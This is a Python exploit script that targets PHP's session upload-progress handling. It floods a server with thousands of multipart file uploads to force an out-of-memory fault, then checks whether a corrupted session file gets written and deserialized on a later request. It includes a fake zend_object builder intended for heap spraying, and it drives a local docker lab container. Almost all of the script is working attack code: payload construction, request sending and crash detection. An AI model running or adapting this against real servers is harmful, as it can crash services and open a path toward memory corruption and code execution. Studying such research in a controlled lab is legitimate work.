#!/usr/bin/env python3
"""
Chain D Pure: OOM via session upload progress corruption path

Theory: When session.upload_progress.enabled=On, rfc1867_post_handler() calls
php_session_rfc1867_callback() which invokes php_session_start(). If OOM fires
AFTER session start but during parsing, php_request_shutdown() calls
php_session_flush() which writes potentially-corrupted $_SESSION to disk.

A follow-up request with the same PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS
triggers php_session_start() in the rfc1867 callback, deserializing the
corrupted session file — all at the HTTP layer, no app code needed.

This is still "any endpoint" because upload progress runs in the multipart
parser, not in user PHP code.

For authorized security research only.
"""

import argparse
import os
import socket
import struct
import subprocess
import sys
import time


def http_get(host, port, path, cookies=None, timeout=10):
    cookie_hdr = ""
    if cookies:
        cookie_hdr = f"Cookie: {cookies}\r\n"
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"{cookie_hdr}"
        f"Connection: close\r\n\r\n"
    )
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req.encode())
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def get_body(resp):
    if b"\r\n\r\n" in resp:
        return resp.split(b"\r\n\r\n", 1)[1]
    return b""


def get_status(resp):
    if resp:
        return resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
    return "NO RESPONSE"


def build_session_oom_payload(boundary, session_key, num_files, fname_size,
                               spray_handler_ptr=None):
    """Build multipart body that:
    1. First field: PHP_SESSION_UPLOAD_PROGRESS to trigger session start
    2. Many file uploads to trigger OOM during progress tracking
    """
    parts = []

    # First: the magic field that triggers upload progress session
    parts.append(
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; "
        f'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
        f"\r\n"
        f"{session_key}\r\n"
    )

    # If spray_handler_ptr provided, add spray fields with fake zend_object data
    if spray_handler_ptr:
        fake_obj = build_fake_object(spray_handler_ptr)
        for i in range(200):
            parts.append(
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="spray{i}"\r\n'
                f"\r\n"
            )
            # Can't put raw binary in text mode, use file upload instead
            pass

    # Then: many file uploads to trigger OOM
    # The session progress callback fires for each file, updating $_SESSION
    for i in range(num_files):
        fname = chr(65 + (i % 26)) * (fname_size - len(str(i))) + str(i)
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
            f"X\r\n"
        )

    parts.append(f"--{boundary}--\r\n")
    return "".join(parts).encode("latin1")


def build_fake_object(handler_ptr):
    """Build a fake zend_object structure for heap spray."""
    # zend_object layout (64-bit):
    # gc (zend_refcounted_h): 8 bytes (refcount=1, type_info=IS_OBJECT<<24)
    # handle: 4 bytes
    # ce: 8 bytes (pointer to zend_class_entry)
    # handlers: 8 bytes (pointer to zend_object_handlers)
    data = b""
    data += struct.pack("<I", 1)          # gc.refcount = 1
    data += struct.pack("<I", (8 << 24))  # gc.type_info = IS_OBJECT
    data += struct.pack("<I", 0)          # handle
    data += b"\x00" * 4                   # padding
    data += struct.pack("<Q", 0)          # ce (NULL - will crash but that's ok)
    data += struct.pack("<Q", handler_ptr) # handlers -> points to fake handlers table
    return data


def send_multipart(host, port, path, body, boundary, cookies=None, timeout=60):
    cookie_hdr = ""
    if cookies:
        cookie_hdr = f"Cookie: {cookies}\r\n"

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"{cookie_hdr}"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=timeout)
    sent = 0
    while sent < len(req):
        chunk = req[sent:sent + 65536]
        s.sendall(chunk)
        sent += len(chunk)
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def read_session_file(session_id):
    """Read the session file from the container."""
    path = f"/tmp/sess_{session_id}"
    r = subprocess.run(
        ["docker", "exec", "php2shell-apache", "cat", path],
        capture_output=True, timeout=5)
    return r.stdout if r.returncode == 0 else b""


def list_session_files():
    """List session files in the container."""
    r = subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c",
         "ls -la /tmp/sess_* 2>/dev/null || echo '(none)'"],
        capture_output=True, text=True, timeout=5)
    return r.stdout.strip()


def clear_session_files():
    """Remove all session files."""
    subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c",
         "rm -f /tmp/sess_*"],
        capture_output=True, timeout=5)


def check_worker_pid(host, port):
    """Get current worker PID."""
    try:
        resp = http_get(host, port, "/index.php")
        body = get_body(resp).decode("latin1", "replace")
        import re
        m = re.search(r"PID[:\s]+(\d+)", body)
        if m:
            return int(m.group(1))
    except:
        pass
    return None


def main():
    ap = argparse.ArgumentParser(
        description="Chain D: Session upload progress OOM corruption")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18081)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--num-files", type=int, default=16000)
    ap.add_argument("--fname-size", type=int, default=500)
    ap.add_argument("--session-id", default="chaind_oom_test")
    ap.add_argument("--retries", type=int, default=3)
    args = ap.parse_args()

    boundary = "CHAIND_SESSION_OOM"
    session_key = "chaind_progress_key"

    print("=" * 70)
    print("  Chain D: Session Upload Progress OOM Corruption")
    print("=" * 70)
    print(f"  Target: {args.host}:{args.port}{args.path}")
    print(f"  Session ID: {args.session_id}")
    print(f"  Upload progress key: {session_key}")
    print(f"  Files: {args.num_files} x {args.fname_size}B names")
    print()

    # ── Step 1: Clean state ──────────────────────────────────────────
    print("[1] Clearing session files...")
    clear_session_files()
    print(f"    Sessions: {list_session_files()}")

    # ── Step 2: Baseline PID ─────────────────────────────────────────
    print("\n[2] Baseline worker PID...")
    pid_before = check_worker_pid(args.host, args.port)
    print(f"    PID: {pid_before}")

    # ── Step 3: Normal session upload progress (baseline) ────────────
    print("\n[3] Normal request with upload progress (baseline)...")
    small_body = build_session_oom_payload(
        boundary, session_key, num_files=5, fname_size=20)
    resp = send_multipart(
        args.host, args.port, args.path, small_body, boundary,
        cookies=f"PHPSESSID={args.session_id}")
    status = get_status(resp)
    print(f"    Status: {status}")

    time.sleep(0.5)
    sess_data = read_session_file(args.session_id)
    print(f"    Session file size: {len(sess_data)} bytes")
    if sess_data:
        # Show first 200 bytes of session data
        preview = sess_data[:200]
        print(f"    Session data preview: {preview}")
    print(f"    Session files: {list_session_files()}")

    # ── Step 4: OOM with session upload progress ─────────────────────
    for attempt in range(1, args.retries + 1):
        print(f"\n[4.{attempt}] OOM bomb with session upload progress "
              f"(attempt {attempt}/{args.retries})...")

        # Clear session first
        clear_session_files()

        # Send OOM-triggering request WITH session upload progress
        oom_body = build_session_oom_payload(
            boundary, session_key,
            num_files=args.num_files, fname_size=args.fname_size)
        print(f"    Payload size: {len(oom_body)} bytes")
        print(f"    Sending with PHPSESSID={args.session_id}...")

        resp = send_multipart(
            args.host, args.port, args.path, oom_body, boundary,
            cookies=f"PHPSESSID={args.session_id}",
            timeout=120)

        oom_ok = False
        if resp:
            status = get_status(resp)
            body = get_body(resp).decode("latin1", "replace")
            print(f"    Status: {status}")
            if "500" in status or "Fatal" in body or "Allowed memory" in body:
                oom_ok = True
                if "tried to allocate" in body:
                    idx = body.find("tried to allocate")
                    print(f"    OOM: {body[idx:idx+60]}")
                else:
                    print("    OOM triggered")
        else:
            oom_ok = True
            print("    No response (worker may have crashed)")

        if not oom_ok:
            print("    [-] OOM not triggered, skipping")
            continue

        # Check: did the session file get written during shutdown?
        time.sleep(0.5)
        sess_data = read_session_file(args.session_id)
        print(f"\n    Post-OOM session file size: {len(sess_data)} bytes")
        if sess_data:
            print(f"    Session data (hex): {sess_data[:100].hex()}")
            print(f"    Session data (text): {sess_data[:200]}")
        else:
            print("    NO session file written (session never started)")

        # Check worker alive
        pid_after = check_worker_pid(args.host, args.port)
        print(f"    Worker PID after OOM: {pid_after}")
        if pid_after == pid_before:
            print("    Same worker survived")
        elif pid_after:
            print(f"    Different worker (was {pid_before})")
            pid_before = pid_after
        else:
            print("    Worker dead!")

        # If session file exists, try to trigger deserialization
        if sess_data:
            print(f"\n    [+] Session file exists! Attempting deserialization...")

            # Send another request that triggers session start via
            # upload progress, reading the corrupted session
            deser_body = build_session_oom_payload(
                boundary, session_key, num_files=3, fname_size=20)
            resp2 = send_multipart(
                args.host, args.port, args.path, deser_body, boundary,
                cookies=f"PHPSESSID={args.session_id}")

            if resp2:
                status2 = get_status(resp2)
                body2 = get_body(resp2).decode("latin1", "replace")
                print(f"    Deserialization request status: {status2}")
                if "500" in status2 or "Fatal" in body2:
                    print(f"    [!] Error during deserialization!")
                    print(f"    Body: {body2[:300]}")
                else:
                    print("    Normal response (no crash)")
            else:
                print("    [!] No response from deserialization request!")

            pid_deser = check_worker_pid(args.host, args.port)
            print(f"    Worker PID after deser: {pid_deser}")

        # Check docker logs for any crash/error
        r = subprocess.run(
            ["docker", "logs", "--tail", "10", "php2shell-apache"],
            capture_output=True, text=True, timeout=5)
        if r.stderr:
            relevant = [l for l in r.stderr.split("\n")
                       if "oom" in l.lower() or "fatal" in l.lower()
                       or "segfault" in l.lower() or "crash" in l.lower()
                       or "signal" in l.lower() or "core" in l.lower()]
            if relevant:
                print(f"\n    Docker logs (relevant):")
                for l in relevant[-5:]:
                    print(f"      {l}")

    # ── Analysis ─────────────────────────────────────────────────────
    print()
    print("=" * 70)
    print("  ANALYSIS")
    print("=" * 70)
    print()
    print("  Session upload progress during OOM:")
    print(f"  - session.upload_progress.enabled = On")
    print(f"  - OOM in rfc1867 after session start?")
    sess_exists = len(read_session_file(args.session_id)) > 0
    if sess_exists:
        print(f"  - Session file written during OOM shutdown: YES")
        print(f"  - Follow-up deserialization: tested above")
    else:
        print(f"  - Session file written during OOM shutdown: NO")
        print(f"  - Implication: php_session_start() never reached,")
        print(f"    or session was not flushed during shutdown")
    print()
    print("=" * 70)

    return 0


if __name__ == "__main__":
    sys.exit(main())
